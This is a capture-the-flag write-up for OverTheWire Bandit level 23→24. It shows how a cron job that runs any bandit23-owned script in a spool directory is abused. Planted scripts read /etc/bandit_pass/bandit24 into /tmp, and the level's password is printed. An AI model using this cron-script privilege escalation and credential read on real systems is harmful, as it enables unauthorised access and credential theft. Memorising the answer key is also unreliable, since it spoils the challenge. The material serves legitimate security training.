# Bandit Level 23 → 24 - Script Execution and Privilege Escalation

## Challenge Description
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution

### Step 1: Exploring System Cron Jobs
Following the established pattern from previous levels, I examined the cron directory:
```bash
ls -la /etc/cron.d/
```

**Output revealed multiple cron jobs including:**
```
-rw-r--r--   1 root root   120 Aug 15 13:16 cronjob_bandit24
```

### Step 2: Examining the Cron Configuration
```bash
cat /etc/cron.d/cronjob_bandit24
```

**Output:**
```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This shows that `/usr/bin/cronjob_bandit24.sh` runs every minute as the bandit24 user.

### Step 3: Analyzing the Script
```bash
cat /usr/bin/cronjob_bandit24.sh
```

**Script contents:**
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

### Step 4: Understanding the Script Logic
**Script breakdown:**
1. **`myname=$(whoami)`** - Gets current user (bandit24 when run by cron)
2. **`cd /var/spool/$myname/foo`** - Changes to `/var/spool/bandit24/foo`
3. **For loop** - Iterates through all files in the directory
4. **Owner check** - `stat --format "%U" ./$i` gets file owner
5. **Execution condition** - Only executes files owned by bandit23
6. **Timeout execution** - `timeout -s 9 60 ./$i` runs script with 60-second limit
7. **Cleanup** - `rm -f ./$i` deletes the file after execution

**Key insight:** The script will execute any file in `/var/spool/bandit24/foo` that is owned by bandit23, and it runs with bandit24 privileges!

### Step 5: Initial Attempt and Permission Issues
I tried to create a script directly in the target directory:
```bash
cd /var/spool/bandit24/foo
nano jerome.sh
```

**Problems encountered:**
- Permission denied when trying to list directory contents
- Could create files but couldn't verify their existence
- Directory had restrictive permissions

### Step 6: Working Around Permission Restrictions
I created my script in a temporary directory first:
```bash
mkdir /tmp/jerome.dir
cd /tmp/jerome.dir
nano jerome.sh
```

**Script content:**
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
```

**Script purpose:**
- Reads bandit24's password file (accessible when running as bandit24)
- Writes it to a world-readable location in `/tmp`

### Step 7: Preparing the Script for Execution
I set the proper permissions and ownership:
```bash
chmod +x jerome.sh
chown bandit23:bandit23 jerome.sh
```

**Critical requirements:**
- **Executable permissions** - Script must be executable
- **Correct ownership** - Must be owned by bandit23 for the cron job to execute it

### Step 8: Deploying the Script
```bash
cp jerome.sh /var/spool/bandit24/foo/
```

This placed the script in the directory where the cron job looks for files to execute.

### Step 9: Waiting for Execution
Since the cron job runs every minute, I waited for it to:
1. Find my script in `/var/spool/bandit24/foo`
2. Verify it's owned by bandit23
3. Execute it with bandit24 privileges
4. Delete the script file

### Step 10: Retrieving the Password
After waiting for the cron job to run:
```bash
cat /tmp/bandit24_password
```

**Success!** Retrieved the bandit24 password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

## Key Learning Points

### 1. Script-Based Privilege Escalation
- **Attack vector**: Automated processes that execute user-provided scripts with elevated privileges
- **Requirements**: Correct file ownership and permissions
- **Execution context**: Scripts run with the privileges of the cron job user (bandit24)

### 2. File Ownership and Permissions
- **Critical importance**: The cron script only executes files owned by bandit23
- **Security check**: `stat --format "%U"` verifies file ownership before execution
- **Permission requirements**: Files must be executable (`chmod +x`)

### 3. Working with Restrictive Directories
- **Problem**: Cannot list contents of `/var/spool/bandit24/foo` due to permissions
- **Solution**: Create files elsewhere, then copy them to the target location
- **Verification**: Cannot directly verify file placement, must trust the copy operation

### 4. Timing and Automation
- **Cron execution**: Scripts run every minute automatically
- **Cleanup behavior**: Scripts are deleted after execution (`rm -f ./$i`)
- **Patience required**: Must wait for the next cron cycle after file placement

### 5. Script Design for Privilege Escalation
- **Simple and focused**: Single-purpose script reduces chance of errors
- **Output redirection**: Write sensitive data to accessible location
- **Error handling**: Keep script simple to avoid execution failures

## Command Summary
```bash
# Reconnaissance
ls -la /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# Script creation and setup
mkdir /tmp/jerome.dir
cd /tmp/jerome.dir
nano jerome.sh
# Script content: #!/bin/bash
#                cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password

# Permission setup
chmod +x jerome.sh
chown bandit23:bandit23 jerome.sh

# Deployment
cp jerome.sh /var/spool/bandit24/foo/

# Password retrieval (after waiting for cron execution)
cat /tmp/bandit24_password
```

## Alternative Script Approaches

### Method 1: Direct Password Echo
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/password_output
```

### Method 2: Multiple Output Locations
```bash
#!/bin/bash
PASSWORD=$(cat /etc/bandit_pass/bandit24)
echo $PASSWORD > /tmp/bandit24_pass
echo $PASSWORD > /tmp/level24_password
```

### Method 3: Timestamped Output
```bash
#!/bin/bash
TIMESTAMP=$(date +%s)
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_$TIMESTAMP
```

## Troubleshooting Common Issues

### 1. Script Not Executing
- **Check ownership**: Ensure file is owned by bandit23
- **Check permissions**: Ensure file is executable
- **Check location**: Verify file is in `/var/spool/bandit24/foo`
- **Wait time**: Allow full minute for cron cycle

### 2. Output File Not Created
- **Script errors**: Ensure script syntax is correct
- **Path permissions**: Verify `/tmp` is writable
- **Timeout issues**: Keep scripts simple and fast

### 3. Permission Problems
- **Directory access**: Use `cp` instead of trying to edit files in place
- **File creation**: Create and test scripts in `/tmp` first

## Real-World Applications

### 1. Penetration Testing
- **Privilege escalation**: Exploiting automated processes that execute user files
- **Persistence**: Placing scripts in locations processed by scheduled tasks
- **Data exfiltration**: Using elevated privileges to access sensitive files

### 2. System Administration
- **Automation security**: Understanding risks of automated script execution
- **File permission auditing**: Ensuring proper ownership controls on sensitive directories
- **Process monitoring**: Tracking what scripts are executed by automated processes

### 3. Incident Response
- **Attack analysis**: Understanding how attackers might abuse scheduled tasks
- **Forensic investigation**: Looking for malicious scripts in automation directories
- **System hardening**: Securing directories used by automated processes

### 4. Security Best Practices
- **Principle of least privilege**: Automated processes should run with minimal necessary permissions
- **Input validation**: Verify scripts before execution
- **Logging**: Monitor and log automated script execution
- **Access controls**: Restrict who can place files in automation directories

## Security Implications

### 1. Automated Execution Risks
- **Trust boundary**: Systems that automatically execute user-provided code
- **Privilege escalation**: Processes running with elevated privileges executing lower-privilege user files
- **Attack persistence**: Ability to repeatedly execute malicious code

### 2. File System Security
- **Directory permissions**: Balancing usability with security
- **Ownership verification**: Checking file ownership before execution
- **Cleanup procedures**: Automatic deletion can help but doesn't prevent initial execution

This level demonstrates a realistic privilege escalation scenario where an automated system process can be exploited to gain higher-level access through careful script placement and timing.
